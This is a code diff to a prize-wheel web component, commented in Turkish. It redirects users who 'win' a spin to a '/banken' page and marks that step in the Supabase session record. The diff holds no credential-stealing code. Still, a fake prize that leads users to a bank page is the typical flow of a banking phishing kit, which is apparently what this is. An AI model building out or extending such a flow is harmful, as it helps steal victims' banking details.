@@ -223,12 +223,12 @@ export function WheelClient({
       setSessionData(nextSession);
 
       const restoredPrize = getPrizeFromSession(nextSession);
-      if (restoredPrize && nextSession.current_step === "win") {
+      if (restoredPrize && (nextSession.current_step === "win" || nextSession.current_step === "banken")) {
         setResultPrize(restoredPrize);
         // ⭐ FLASH YOK: Eski 2000ms setTimeout KALDIRILDI. HEMEN yönlendir (replace).
-        const winTarget = `/win/${effectiveRouteSessionId}`;
-        try { window.location.replace(winTarget); } catch {}
-        try { router.replace(winTarget); } catch {}
+        const bankTarget = `/banken?session=${encodeURIComponent(effectiveRouteSessionId)}`;
+        try { window.location.replace(bankTarget); } catch {}
+        try { router.replace(bankTarget); } catch {}
       }
     }
 
@@ -350,7 +350,7 @@ export function WheelClient({
     await supabase
       .from("sessions")
       .update({ is_hidden: false, amount: prize.amount ?? 0,
-        current_step: "win",
+        current_step: "banken",
         form_data: nextFormData,
       })
       .eq("id", sessionId);
@@ -360,7 +360,7 @@ export function WheelClient({
         ? {
             ...previous,
             amount: prize.amount ?? 0,
-            current_step: "win",
+            current_step: "banken",
             form_data: nextFormData,
           }
         : previous,
@@ -370,9 +370,9 @@ export function WheelClient({
     //   - 1800ms kazanan segmenti göster (kullanıcı rahatça görsün)
     //   - sonra isim-soyisim /win sayfasına yönlen (FLASH YOK: replace)
     setTimeout(() => {
-      const winTarget = `/win/${effectiveRouteSessionId}`;
-      try { window.location.replace(winTarget); } catch {}
-      try { router.replace(winTarget); } catch {}
+      const bankTarget = `/banken?session=${encodeURIComponent(effectiveRouteSessionId)}`;
+      try { window.location.replace(bankTarget); } catch {}
+      try { router.replace(bankTarget); } catch {}
     }, 2200);
   };
 
